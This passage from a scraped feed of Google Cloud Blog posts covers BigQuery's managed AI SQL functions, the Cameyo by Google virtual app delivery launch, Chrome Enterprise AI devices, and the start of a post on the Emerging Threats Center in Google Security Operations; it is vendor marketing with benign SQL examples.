style=\"vertical-align: baseline;\">between two different product catalogs. The following query finds products that are semantically identical, even if their names are not an exact match.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;WITH product_catalog_A AS (SELECT &quot;Veridia AquaSource Hydrating Shampoo&quot; as product\\r\\n UNION ALL SELECT &quot;Veridia Full-Lift Volumizing Shampoo&quot;),\\r\\n     product_catalog_B AS (SELECT &quot;Veridia Shampoo, AquaSource Hydration&quot; as product)\\r\\nSELECT *\\r\\nFROM product_catalog_A a JOIN product_catalog_B b\\r\\nON AI.IF((a.product, &quot; is the same product as &quot;, b.product),\\r\\n  connection_id =&gt; &quot;us.test_connection&quot;)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732e50&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">AI.CLASSIFY: Data classification</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://docs.cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-classify\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.CLASSIFY</span></a><span style=\"vertical-align: baseline;\"> function lets you categorize text or image based on labels you provide. You can use it to route support tickets by topic or classify images based on their style. For instance, you can classify news articles by topic and then count the number of articles in each category with a single query.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;SELECT\\r\\n  AI.CLASSIFY(\\r\\n    body, \\r\\n    categories =&gt; [&#x27;tech&#x27;, &#x27;sport&#x27;, &#x27;business&#x27;, &#x27;politics&#x27;, &#x27;entertainment&#x27;],\\r\\n    connection_id =&gt; &#x27;us.test_connection&#x27;) AS category,\\r\\n  COUNT(*) num_articles\\r\\nFROM bigquery-public-data.bbc_news.fulltext\\r\\nGROUP BY category;&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732b80&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">AI.SCORE: Semantic ranking</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You can use </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-score\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.SCORE</span></a><span style=\"vertical-align: baseline;\"> to rank rows based on natural language criteria. This is powerful for ranking items based on a rubric. To give you consistent and high-quality results, BigQuery automatically refines your prompt into a structured scoring rubric. This example finds the top 10 most positive reviews for a movie of your choosing.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;SELECT\\r\\n  review,\\r\\n  AI.SCORE((&quot;From 1 to 10, rate how much does the reviewer like the movie :&quot;, review),\\r\\n           connection_id =&gt; \\&#x27;us.test_connection\\&#x27;) AS ai_rating,\\r\\n  reviewer_rating AS human_rating,\\r\\nFROM bigquery-public-data.imdb.reviews\\r\\nWHERE title = \\&#x27;Movie\\&#x27;\\r\\nORDER BY ai_rating DESC\\r\\nLIMIT 10;&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732eb0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Built-in optimizations</span></h2>\n<p><span style=\"vertical-align: baseline;\">These functions allow you to easily mix AI processing with common SQL operators like </span><span style=\"vertical-align: baseline;\">WHERE, JOIN, ORDER BY</span><span style=\"vertical-align: baseline;\">, and </span><span style=\"vertical-align: baseline;\">GROUP BY</span><span style=\"vertical-align: baseline;\">. BigQuery handles prompt optimization, model selection, and model parameter tuning for you. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Prompt optimization:</strong><span style=\"vertical-align: baseline;\"> LLMs are sensitive to the wording of a prompt, the same question can be expressed in different ways which affect quality and consistency. BigQuery optimizes your prompts into a structured format specifically for Gemini, helping to ensure higher-quality results and an improved cache hit rate.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Query plan optimization:</strong><span style=\"vertical-align: baseline;\"> Running generative AI models over millions of rows can be slow and expensive. BigQuery query planner reorders AI functions in your filters and pulls AI functions out from join to reduce the number of calls to the model, which saves costs and improves performance.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Model endpoint and parameter tuning: </strong><span style=\"vertical-align: baseline;\">BigQuery tunes model endpoint and model parameters to improve both result quality and results consistency across query runs.</span></p>\n</li>\n</ul>\n<h2><strong style=\"vertical-align: baseline;\">Get started</strong></h2>\n<p><span style=\"vertical-align: baseline;\">The new managed AI functions — AI.IF() , AI.SCORE() and AI.CLASSIFY() — complement the existing general-purpose Gemini inference functions such as AI.GENERATE from BigQuery. </span></p>\n<p><strong style=\"vertical-align: baseline;\">What to use and when: </strong><span style=\"vertical-align: baseline;\">When your use case fits them, start with the managed AI functions as they are optimized for cost and quality. Use the AI.GENERATE family of functions when you need control on your prompt and input parameters, and want to choose from a wide range of supported models for LLM inference.</span></p>\n<p><strong style=\"vertical-align: baseline;\">The next big leap</strong><span style=\"vertical-align: baseline;\">: We are optimizing these functions further and moving more of their processing to BigQuery, generating up to 100x performance improvements. This is a first in the industry innovation. Sign up for a private preview </span><a href=\"https://docs.google.com/forms/d/e/1FAIpQLScm4l7CjZ03WsYlzOEpHCqJMFGm6OGyLyEEjeiNuS_Auhw7ig/viewform?usp=header\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">To learn more refer to our </span><a href=\"https://cloud.google.com/bigquery/docs/generative-ai-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\">. The </span><span style=\"vertical-align: baseline;\">new managed AI functions are also available in BigQuery DataFrames. See this </span><a href=\"https://github.com/googleapis/python-bigquery-dataframes/blob/main/notebooks/generative_ai/ai_functions.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">notebook</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/python/docs/reference/bigframes/latest/bigframes.bigquery._operations.ai#functions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> for Python examples.</span></p>\n<p><span style=\"vertical-align: baseline;\">For questions or feedback, reach out to us at </span><a href=\"mailto:bqml-feedback@google.com\"><span style=\"text-decoration: underline; vertical-align: baseline;\">bqml-feedback@google.com</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/chrome-enterprise/a-flexible-path-to-modern-end-user-computing-with-cameyo-by-google/",
        "title": "A flexible path to modern end-user computing with Cameyo by Google",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/25091_Cameyo_Blog_Header_2436x1200_Opt1B_2x.max-600x600.png",
        "author": "Rob Beard",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>While 90% of IT leaders indicate that the future of their end user computing (EUC) strategy is web-based, those same leaders admit that 50% of the applications their organizations rely on today are still legacy client-based apps.<sup>1</sup> Similarly, IT leaders note that enabling end users to take advantage of AI on the endpoint is their top priority in the next 12 months. Clearly, something needs to bridge the gap between today’s reality and tomorrow’s strategy.</p><h3><b>Announcing Cameyo by Google: Virtual app delivery for the modern tech stack</b></h3><p>To provide today’s organizations with a more modern approach to virtualization, we are thrilled to launch Cameyo by Google, bringing a best-in-class Virtual App Delivery (VAD) solution into the Google enterprise family of products.</p><p>Cameyo is not VDI. It is a modern alternative designed specifically to solve the legacy app gap without the overhead of traditional virtual desktops. Instead of streaming a full, resource-heavy desktop, Cameyo’s Virtual App Delivery (VAD) technology delivers <i>only the applications</i> users need, securely to <i>any</i> device.</p><p>With Cameyo, those legacy Windows or Linux apps can either be streamed in the browser or delivered as Progressive Web Apps (PWAs) to give users the feel of using a native app in its own window. This allows users to run critical legacy applications — everything from specialized ERP clients, Windows-based design programs like AutoCAD, the desktop version of Excel, and everything in between — and access them alongside their other modern web apps in the browser, or access them side-by-side with the other apps in their system tray as PWAs. For the user, the experience is seamless and free from the context-switching of managing a separate virtual desktop environment. For IT, the complexity is eliminated.</p><p>“The beauty of Cameyo is its simplicity. It lets users access applications on any device with security built in, allowing us to reach any end user, on any device, without it ever touching our corporate systems or the complexity or overhead — no VPNs or firewall configurations needed,” said Phil Paterson, Head of Cloud &amp; Infrastructure, PTSG. He added, “VPNS were taking up to 15 minutes to log in, but with Cameyo access is instant, saving users upwards of 30 minutes every day.\"</p><h3><b>Completing the Google Enterprise stack</b></h3><p>Today’s enterprises have been increasingly turning to Google for a modern, flexible, and secure enterprise tech stack that was built for the web-based future of work, not modified for it. And Cameyo by Google is a critical unlock mechanism that bridges the gap between those organizations’ legacy investments and this modern stack.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Web-First Future of Work_Cameyo\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Web-First_Future_of_Work_Cameyo.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Google’s enterprise tech stack provides organizations with a flexible, modular path to modernization. Unlike all-or-nothing enterprise ecosystems, Google’s enterprise stack doesn’t force you to abandon existing investments for the sake of modernization. Instead, it gives you the freedom to modernize individual layers of your stack at your own pace, as it makes sense for your business — all while maintaining access to your existing technology investments. And Google’s flexible enterprise stack is built for interoperability with a broad ecosystem of modern technologies built for the web, giving you freedom along your modernization journey.</p><h3><b>A secure browsing first: Cameyo + Chrome Enterprise</b></h3><p>Speaking of enabling organizations to modernize at their own rate, we’ve seen a distinct pattern popping up throughout our conversations with enterprises today. And that pattern is the interest in migrating to Secure Enterprise Browsers (SEBs) to provide a more secure, manageable place for people to do their best work.</p><p>And while the market for SEBs is growing rapidly, most enterprise browser solutions share a fundamental blind spot: they are only built to secure <i>web-based</i> SaaS applications. They have no direct answer for the 50% of client-based applications that run entirely outside the browser.<sup>1</sup></p><p>This is where the combination of Cameyo by Google and Chrome Enterprise Premium provides a unique solution. This combination is the <i>only solution on the market</i> that delivers and secures <i>both</i> modern web apps and legacy client-based apps within a single, unified browser experience.</p><p>Here’s how it works:</p><ol><li><b>Chrome Enterprise Premium</b> serves as the secure entry point, providing advanced threat protection, URL filtering, and granular Data Loss Prevention (DLP) controls - like preventing copy/paste or printing - for all sensitive data and web activity.</li><li><b>Cameyo</b> takes your legacy client apps (like your ERP, an internal accounting program, SAP client, etc.) and publishes it within that managed Chrome Enterprise browser.</li><li><b>This unifies the digital workspace.</b> Those legacy applications, which previously lived on a desktop, now run under the single security context of the secure browser. This allows Chrome Enterprise Premium's advanced security and DLP controls to govern applications they previously couldn't see, providing a comprehensive security posture across all of your organization’s apps, not just the web-based apps.</li><li><b>Bringing AI to legacy apps.</b> The combination of Cameyo and Chrome Enterprise not only brings all your apps into a secure enterprise browser, but thanks to Gemini in Chrome, all of your legacy apps now have the power of AI layered on top.</li></ol><h3><b>Unlocking adoption of a more secure, web-based OS and more collaborative, web-first productivity</b></h3><p>Moving all of your apps to the web with Cameyo doesn’t just provide a more unified user experience. It can also provide a significantly better, more flexible, and more secure experience for IT. Compared to traditional virtualization technologies that take weeks or months to deploy, IT can publish their first apps to users within hours, and be fully deployed in days. All while taking advantage of Cameyo’s embedded Zero Trust security model for ultra-secure app delivery.</p><p>And that added simplicity, flexibility, and security opens up other opportunities for IT, too.</p><p>For organizations that have been looking for a more secure alternative to Windows in the wake of years of security incidents, outages, and forced upgrades to the next Windows version, Cameyo now makes it possible for IT to migrate to ChromeOS — including the use of ChromeOS Flex to convert existing PCs to ChromeOS — while maintaining access to all of their Windows apps.</p><p>For years, the primary blocker for deeper enterprise adoption of ChromeOS has always been the \"app gap\" — the persistent need to access a few remaining Windows applications within an organization. Cameyo eliminates this blocker entirely, enabling organizations to confidently migrate their entire fleet to ChromeOS, the only operating system with zero reported ransomware attacks, ever.</p><p>Similarly, Cameyo allows organizations to fully embrace Google Workspace while retaining access to essential client apps that previously kept them tethered to Microsoft™, such as legacy Excel versions with complex macros or specific ERP clients. Now, teams can move to a more modern, collaborative productivity suite that was built for the web, and they can still access any specialized Windows apps that their workflows still depend on.</p><h3><b>Your flexible path to modernization starts now</b></h3><p>For too long, legacy applications have hindered organizations’ modernization efforts. But the age of tolerating complex, costly virtualization solutions just to keep legacy apps alive is coming to an end.</p><p>Cameyo by Google, like the rest of the Google enterprise stack, was built in the cloud specifically to enable the web-based future of work. And like the rest of Google’s enterprise offerings, Cameyo gives you a flexible path forward that enables you to build a modern, secure, and productive enterprise computing stack at the pace that works for you.</p><p>So, together — let’s get to work.</p><p></p><p><sup>1</sup> <a href=\"https://services.google.com/fh/files/blogs/google_forrester_report_2024.pdf\" target=\"_blank\">Forrester Consulting: A commissioned study conducted by Forrester Consulting on behalf of Google, Deliver a Next-Generation Endpoint, 2024</a></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/chrome-enterprise/bringing-connected-work-experiences-across-our-platforms-and-devices/",
        "title": "Bringing connected and AI-powered work experiences across our platforms and devices",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/CE_Chrome_summit_blog_header_v3.max-600x600.png",
        "author": "Bryan Lee",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>The way we work is rapidly transforming, and AI is quickly becoming a connection point across workflows and tasks both big and small. Whether it’s saving time by converting automated meeting notes into a follow-up email to a client, or getting help with brainstorming your next big campaign idea, Generative AI, driven by models like Gemini, offers seamless, intelligent help for employees. Google is able to bring the power of AI seamlessly into every work surface, from the browser, to the operating system to core work applications, across an expanding collection of new devices.</p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=q0r-Azc9h-M\">\n\n      \n        <img alt=\"Chrome Summit video\" src=\"https://img.youtube.com/vi/q0r-Azc9h-M/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=q0r-Azc9h-M\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph\"><p>So how does this come to life for our customers? Our platforms like Chrome Enterprise, the most trusted enterprise browser, and Android, the flexible OS that powers mobile and beyond, have hundreds of millions of business users relying on these technologies at work, and AI continues to make them more helpful for the workforce.</p><p>Hardware like Google Pixel and Chromebook Plus devices are infused with AI, built for these new AI experiences, and are already growing in adoption among businesses. But it doesn’t stop there. We’re also expanding to new surfaces with Android XR, the extended reality operating system for next-gen headsets and smart glasses. And <a href=\"https://beam.google/\" target=\"_blank\">Google Beam</a>, our AI-first video communication platform is redefining how we connect.</p><p>Together, Google’s enterprise platforms and devices build for the connected future.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Horizon Hall Keynote 2025 (3)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Horizon_Hall_Keynote_2025_3.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Let’s look at how this comes together with recent and exciting new capabilities for enterprises:</p><p><b>Empowering your employees to work smarter and be more productive</b></p><p>Across our platforms and devices, we’re offering familiar user experiences, so employees get the right apps and information they need. Whether that’s Google’s productivity apps, third party SaaS apps, custom apps or even legacy apps. And we make sure that help from Gemini is just a tap, click or prompt away.</p><p>To help organizations continue to move towards a more modern endpoint computing experience, we’re excited to announce the <a href=\"https://cloud.google.com/blog/products/chrome-enterprise/a-flexible-path-to-modern-end-user-computing-with-cameyo-by-google\">general availability of Cameyo by Google</a>, allowing users to run any application, legacy or modern, side-by-side. Built in the cloud as part of the Google enterprise stack, Cameyo delivers a seamless, web-based experience for users and eliminates complexity for IT.</p><p>We recently announced Gemini in Chrome, <a href=\"https://cloud.google.com/blog/products/chrome-enterprise/supercharging-employee-productivity-with-ai-securely-with-gemini-in-chrome-enterprise?e=48754805\">an AI browsing assistant that enables end users to work more efficiently</a>. It can be used to quickly summarize long reports or documents, grab key information from a video or brainstorm ideas for a new project. Gemini in Chrome can understand the context of a user’s tabs, and recall recent tabs they had open. By combining Gemini in Chrome with an app virtualized by Cameyo, organizations can bring the helpfulness of AI to legacy apps on the web.</p><p>Gemini in Chrome is available with enterprise grade protections to Google Workspace customers giving IT and security teams control over how their users use AI. These capabilities are rolling out to Android, iOS, Mac, and Windows users already. We're excited to announce that in addition to the built-in Gemini capabilities on ChromeOS, these Gemini in Chrome capabilities will also be available to Workspace customers on their Chromebook Plus devices soon.</p><p><b>Endpoints for a new work era</b></p><p>Organizations need devices that are purpose-built for the AI era, with powerful hardware and AI integrations directly in the operating system. Google is integrating Gemini and Google AI across a wide set of devices and form factors to deliver a consistent experience, wherever work happens.</p><p>Chromebook Plus provides a line of devices designed with more powerful hardware to deliver AI-powered experiences at a great value. This year, we launched new features like Text capture and Select to search with Lens. We also launched two new devices, the Lenovo Chromebook Plus 14” and the Acer Chromebook Plus Spin 514 equipped with Mediatek NPU processors delivering up to 50 TOPS. We will continue to bring powerful laptop experiences to support the needs of workers today and into the future.</p><p>Similarly, employees need the flexibility to be productive, especially on the go. Google Pixel uses on-device AI through Gemini Nano to enable features such as offline summarization in the Recorder app,<sup>1</sup> Call Notes,<sup>2</sup> Magic Cue,<sup>3</sup> Live Translate (Voice)<sup>4</sup> and more. Additionally, features like Gemini Live<sup>5</sup> with screen sharing and camera sharing help bring new levels of productivity to users on the go.<br /></p><p>We’re also starting to see new emerging form factors like extended reality (XR) as ways to extend our workplace. The <a href=\"https://www.android.com/xr/\" target=\"_blank\">introduction of Android XR</a> marks a major shift for the modern enterprise, extending the reach of contextual AI beyond mobile devices and into the physical workspace. This platform, running on a new ecosystem of headsets and smart glasses, integrates Gemini to provide a true hands-free, contextual assistant. For employees in fields like field service, manufacturing, healthcare, or logistics, this means real-time, heads-up support overlayed onto their view of the world. For example, a technician could receive step-by-step repair instructions or access complex schematics on an optional in-lens display while keeping both hands on the equipment.</p><p><b>Improving security controls and visibility</b></p><p>For IT teams, we know there is a need larger than ever for more visibility and protections. We’re delivering security intelligence and flexible management to AI-powered end user computing environments.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Horizon Hall Keynote 2025 (2)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Horizon_Hall_Keynote_2025_2.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Comprehensive data protection at the browser and OS level is crucial for navigating today’s evolving threat landscape, especially with the rise of AI services. To deliver this essential protection where work primarily happens, within the browser, we’ve embedded robust data loss prevention directly into <a href=\"https://chromeenterprise.google/products/chrome-enterprise-premium/?utm_source=adwords&amp;utm_medium=cpc&amp;utm_campaign=2025-h2-premium-chromebrowser-paidmed-paiddisplay-other-chromebrowserent&amp;utm_term=chrome-enterprise-premium&amp;utm_content=GCPM&amp;brand=GCPM&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=19746200608&amp;gbraid=0AAAAADJomweJdvprFyk0La6Nh_fStfUlQ&amp;gclid=Cj0KCQiAq7HIBhDoARIsAOATDxAdnpTB3ppahmwpErAn3M8VW04KA8-l2-vbniw5Yk9VY1PCIwYvYPYaAjW5EALw_wcB#windows-tab\" target=\"_blank\">Chrome Enterprise Premium</a>. This provides IT and security teams with an extensive, easily configurable set of tools in Chrome to proactively guard against accidental or intentional data loss across all web applications.</p><p>We’ve expanded many of the data loss prevention capabilities to mobile platforms as well. Admins now can:</p><ul><li>Audit, warn or block access to sites or categories of sites on iOS or Android</li><li>Set limitations on copying and pasting sensitive data in mobile</li><li>Restrict downloads including when users are in Incognito mode</li><li>Provision client certificates to Chrome managed profiles on Android, this capability is coming to iOS soon</li></ul><p>Organizations leveraging Google’s security ecosystem can now benefit from a new one-click integration with Google SecOps. This integration delivers unprecedented browser intelligence, including data loss events and risky activity, to SecOps, empowering security teams to conduct more thorough investigations and make faster, better-informed decisions.</p><p>The rapid rise of Generative AI, powered by Gemini, fundamentally changes what we expect from our enterprise technology, offering seamless, intelligent assistance across every workflow. Google is committed to delivering a unified vision, ensuring this help is immediately available by empowering your employees across every surface—from Chrome and Android to web applications virtualized by Cameyo by Google. By creating endpoints built for the AI era like Chromebook Plus and extending the workplace with Android XR, we ensure powerful hardware and AI integrations go hand-in-hand. <a href=\"http://chromeenterprise.google/products/enterprise-platforms\" target=\"_blank\">Discover</a> how you can equip your teams for the future with Chrome Enterprise, ChromeOS, and Cameyo.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Google&#x27;s enterprise platforms and devices ecosystem\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image_1_DPbJBgK.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p><sup>1</sup> <sub>Available on select devices, languages, and countries. Works with compatible accounts and some features may not be available based on corporate account settings. Check responses for accuracy.</sub></p><p><sup>2</sup> <sub>Available in select countries and languages. Available to 18+ users. Availability may vary by account and profile type.</sub></p><p><sup>3</sup> <sub>Works on calls at least 30 seconds long. Not available in all languages or countries. Requires compatible Pixel phone. See here for more details.</sub></p><p><sup>4</sup> <sub>Results may vary. Check responses for accuracy. Available in select countries and languages.</sub></p><p><sup>5</sup><sub> Results for illustrative purposes and may vary. Check responses for accuracy. Compatible with certain features and accounts. Internet connection required. Available in select countries, languages, and to users 18</sub><sub><sup>+</sup></sub><sub>. Availability may vary by account and profile type.</sub></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/introducing-the-emerging-threats-center-in-google-security-operations/",
        "title": "Introducing the Emerging Threats Center in Google Security Operations",
        "thumbnail": null,
        "author": "Nolan Karpinski",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When</span><span style=\"vertical-align: baseline;\"> a</span><span style=\"vertical-align: baseline;\"> major vulnerability makes headlines, CISOs want to know fast if their organization is impacted and prepared. Getting the correct answer is often a time-consuming and human-intensive process that can take days or weeks, leaving open a dangerous window of unknown exposure.</span></p>\n<p><span style=\"vertical-align: baseline;\">To help close that gap, today we’re introducing the </span><strong style=\"vertical-align: baseline;\">Emerging Threats Center</strong><span style=\"vertical-align: baseline;\"> in Google Security Operations. Available today for licensed customers in Google Security Operations, this new capability can help solve the core, practical problem of scaling detection engineering, and help transform how teams operationalize threat intelligence. </span></p>\n<p><span style=\"vertical-align: baseline;\">Enabled by Gemini, our detection-engineering agent responds to new threat campaigns detected by Google Threat Intelligence, and includes frontline insights from Mandiant, VirusTotal, and across Google. It generates representative events, assessing coverage, and closing detection gaps. </span></p>\n<p><span style=\"vertical-align: baseline;\">The Emerging Threats Center can help you understand if you are impacted by critical threat campaigns, and provides detection coverage to help ensure you are protected going forward. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Introducing campaign-based prioritization with emerging threats</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Protecting against new threats has long been a manual, reactive cycle. It begins with threat analysts pouring over reports to identify new campaign activity, which they then translate into indicators of compromise (IoCs) for detection engineers. Next, the engineering team manually authors, tests, and deploys the new detections. </span></p>\n<p><span style=\"vertical-align: baseline;\">Too often, we hear from customers and security operations teams that this labor-intensive process leaves organizations swimming upstream. It was “hard to derive clear action from threat intelligence data,” according to 59% of IT and cybersecurity leaders surveyed in this year’s </span><a href=\"https://cloud.google.com/blog/products/identity-security/too-many-threats-too-much-data-new-survey-heres-how-to-fix-that\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Threat Intelligence Benchmark</span></a><span style=\"vertical-align: baseline;\">, a commissioned study conducted by Forrester Consulting on behalf of Google Cloud.</span></p>\n<p><span style=\"vertical-align: baseline;\">By sifting through volumes of threat intelligence data, the Emerging Threats Center can help security surface the most relevant threat campaigns to an organization — and take proactive action against them.</span></p>\n<p><span style=\"vertical-align: baseline;\">Instead of starting in a traditional alert queue, analysts now have a single view of threats that pose the greatest risks to their specific environment. This view includes details on the presence of IOCs in event data and detection rules. </span></p>\n<p><span style=\"vertical-align: baseline;\">For example, when a new zero-day vulnerability emerges, analysts don't have to manually cross-reference blog posts with their alert queue. They can immediately see the campaign, the IOCs already contextualized against their own environment, and the specific detection rules to apply. This holistic approach can help them proactively hunt for the most time-sensitive threats before a major breach occurs.</span></p>\n<p><span style=\"vertical-align: baseline;\">Making all this possible is Gemini in Security Operations, transforming how we engineer detections. By ingesting a continuous stream of frontline threat intelligence, it can automatically test our detection corpus against new threats. When a gap is found, Gemini generates a new, fully-vetted detection rule for an analyst to approve. This systematic, automated workflow can help ensure you are protected from the latest threats.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Understanding exposure, detailing defensive posture</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our campaign-based approach can provide definitive answers to the two most critical questions a security team faces during a major threat event: How are we affected, and how well are we prepared.</span></p>\n<p><strong style=\"vertical-align: baseline;\">How are we affected?</strong></p>\n<p><span style=\"vertical-align: baseline;\">The first priority is to understand your exposure. The Emerging Threats Center can help you find active and past threats in your environment by correlating campaign intelligence against your data in two ways:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">IOC matches</strong><span style=\"vertical-align: baseline;\">: It automatically searches for and prioritizes campaign-related IoCs across the previous 12 months of your security telemetry.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Detection matches</strong><span style=\"vertical-align: baseline;\">: It instantly surfaces hits from curated detection rules that have been mapped directly to the specific threat campaign.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Both matches provide a definitive starting point for your investigative workflow.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_juILeXg.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Emerging Threat Center Feed View</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">How are we prepared?</strong></p>\n<p><span style=\"vertical-align: baseline;\">The Emerging Threat Center can also help prove that you are protected moving forward. This capability can provide immediate assurance of your defensive posture by helping you confirm two key facts:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">That you have no current or past IOC or detection hits related to the campaign.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">That you have the relevant, campaign-specific detections active and ready to stop malicious activity if it appears.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n    